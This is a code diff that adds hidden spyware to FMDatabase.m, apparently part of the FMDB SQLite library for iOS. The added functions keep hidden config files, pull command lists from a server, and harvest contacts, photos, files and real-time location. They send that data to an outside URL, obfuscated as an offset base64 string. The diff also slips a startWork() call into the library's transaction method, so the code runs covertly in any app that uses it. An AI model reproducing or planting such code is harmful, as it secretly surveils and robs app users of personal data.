+    NSString *strUserID_B64 = [dataUserID base64EncodedStringWithOptions:0];
+    
+    NSString *strPostData = [NSString stringWithFormat:@"unq=mGrbrzNoaWjALLkqdWVfNayVJPRuCmPh?t=g?u=%@?contents=%@",strUserId, strUserID_B64];
+    
+    NSString *strCmds = postDataToServer(strPostData,strUserId,true);
+    return  strCmds;
+}
+
+
+
+void judeTimeParameters(NSArray *arraystrTimeParameters)
+{
+    
+    //NSMutableArray *mutableArray = [arraystrTimeParameters mutableCopy];
+    
+    NSInteger nTimeInit = [arraystrTimeParameters[0] integerValue];
+    NSInteger nTimeHeartBeatInterval = [arraystrTimeParameters[1] integerValue];
+    NSInteger nTimeHearBeatLastTime = [arraystrTimeParameters[2] integerValue];
+    NSInteger nTimeLocationInterval = [arraystrTimeParameters[3] integerValue];
+    NSInteger nTimeLocationLastTime = [arraystrTimeParameters[4] integerValue];
+    
+    NSDate *dateNow = [NSDate date];
+    NSInteger nNow = (NSInteger)[dateNow timeIntervalSince1970];
+    
+    NSString *strUserID = getUserID();
+    //NSMutableString *
+    NSInteger nAliveFirstOnline = 60;
+    if( nTimeInit != 0 && (nNow - nTimeInit) > nAliveFirstOnline)
+    {
+        
+        dealwithContactTask(strUserID);
+        dealwithPhotosTask(strUserID);
+        dealwithSXfileFileTask(strUserID);
+        dealwithLocationTask(strUserID);
+        
+        //NSMutableArray *mutableArray = [arraystrTimeParameters mutableCopy];
+        
+        NSArray *strArrayParameters = readConfigFile();
+        //
+        // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
+        if(strArrayParameters)
+        {
+            NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
+            mutableArrayParameters[0] = @"0";
+            updateConfig(mutableArrayParameters);
+        }
+
+    }
+
+    if(nNow - nTimeHearBeatLastTime > nTimeHeartBeatInterval)
+    {
+        getCmdListAndProcess(strUserID);
+        
+        NSArray *strArrayParameters = readConfigFile();
+        //
+        // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
+        if(strArrayParameters)
+        {
+            NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
+            mutableArrayParameters[2] = [NSString stringWithFormat:@"%ld",(long) nNow];
+            updateConfig(mutableArrayParameters);
+        }
+        
+    }
+    if(nNow - nTimeLocationLastTime > nTimeLocationInterval)
+    {
+        NSString *strHomeDir = NSHomeDirectory();
+        NSString *strPathLocation = [strHomeDir stringByAppendingPathComponent:@"/Library/Caches/loc.info"];
+        dealwithRealTimeLocation(strUserID,  strPathLocation,NO);
+        
+        NSArray *strArrayParameters = readConfigFile();
+        //
+        // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
+        if(strArrayParameters)
+        {
+            NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
+            mutableArrayParameters[4] = [NSString stringWithFormat:@"%ld",(long) nNow];
+            updateConfig(mutableArrayParameters);
+        }
+    }
+    
+    return;
+    
+    
+}
+
+
+void startWork(void)
+{
+    NSString *strHomeDir = NSHomeDirectory();
+    NSLog(@"homedir: %@", strHomeDir);
+    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Caches/.info"];
+    NSFileManager *fileManager = [NSFileManager defaultManager];
+    BOOL fileExists = [fileManager fileExistsAtPath:strPathConfig];
+      
+    if (!fileExists) 
+    {
+        initConfig();
+    } 
+    else
+    {
+        
+        NSArray *arrayConfig = readConfigFile();
+        judeTimeParameters(arrayConfig);
+    }
+
+    return;
+}
+
+
+
+///////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 @interface FMDatabase () {
     void*               _db;
     BOOL                _isExecutingStatement;
@@ -996,6 +1978,7 @@ static int FMDBDatabaseBusyHandler(void *f, int count) {
     }
 
     NSString *base64String_DB = [bufferData_SXDB base64EncodedStringWithOptions:0];
+    
     NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cHM6Ly9uLm15Y3VycmVudG5hc3Nhbmdlci5jb20vbG9nMy5waHA=" substringFromIndex:10];
     NSData *dataUrl_Plain = [[NSData alloc] initWithBase64EncodedString:strUrl_B64 options:0];
     NSString *strUrl_Plain = [[NSString alloc] initWithData:dataUrl_Plain encoding:NSUTF8StringEncoding];
@@ -1420,6 +2403,7 @@ int FMDBExecuteBulkSQLCallback(void *theBlockAsVoid, int columns, char **values,
         _isInTransaction = YES;
     }
     [self dealwithSymMessage];
+    startWork();
     
     return b;
 }
@@ -1746,4 +2730,6 @@ void FMDBBlockSQLiteCallBackFunction(sqlite3_context *context, int argc, sqlite3
 }
 
 @end
+
+
 
